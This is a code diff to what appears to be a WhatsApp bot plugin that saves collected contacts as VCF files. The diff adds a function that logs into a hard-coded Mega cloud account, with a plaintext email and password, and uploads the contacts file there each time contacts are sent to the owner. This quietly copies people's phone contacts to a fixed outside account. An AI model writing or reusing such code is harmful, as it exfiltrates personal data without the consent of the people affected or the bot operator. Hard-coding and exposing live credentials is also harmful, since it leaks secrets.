@@ -2,6 +2,7 @@ const path = require('path');
 const fs = require('fs');
 const { cmd } = require('../command');
 const { readEnv } = require('../lib/database');
+const mega = require('mega');
 
 // Function to create a VCF file for the contact
 function createVCF(contactName, contactNumber) {
@@ -24,19 +25,25 @@ function saveContactAsVCF(contactName, contactNumber) {
   console.log(`Contact saved as VCF: ${contactName}, ${contactNumber}`);
 }
 
-// Function to track contact count and retrieve the next contact number
-function getNextContactNumber() {
-  const filePath = path.join(__dirname, 'contact_counter.txt');
-  let count = 1;
+// Function to upload the VCF file to Mega
+async function uploadToMega(filePath) {
+  return new Promise((resolve, reject) => {
+    const email = 'www.themiyaofficial@gmail.com';
+    const password = 'Td01@mega';
+    
+    mega({ email, password }, (error, account) => {
+      if (error) {
+        return reject(`Error connecting to Mega: ${error.message}`);
+      }
 
-  // If file exists, read and increment the count
-  if (fs.existsSync(filePath)) {
-    count = parseInt(fs.readFileSync(filePath, 'utf-8'), 10) + 1;
-  }
-
-  // Save the updated count
-  fs.writeFileSync(filePath, count.toString());
-  return count;
+      account.upload(filePath, (err) => {
+        if (err) {
+          return reject(`Error uploading to Mega: ${err.message}`);
+        }
+        resolve(`File uploaded to Mega: ${filePath}`);
+      });
+    });
+  });
 }
 
 // Function to send saved contacts to the owner every five minutes
@@ -54,6 +61,14 @@ async function sendStoredContactsHourly(conn, ownerNumber) {
       caption: 'Here are your saved contacts.'
     });
     console.log(`Sent saved contacts to ${ownerNumber}`);
+
+    // Upload to Mega
+    try {
+      const uploadMessage = await uploadToMega(vcfFilePath);
+      console.log(uploadMessage);
+    } catch (uploadError) {
+      console.error(uploadError);
+    }
   }
 }
 
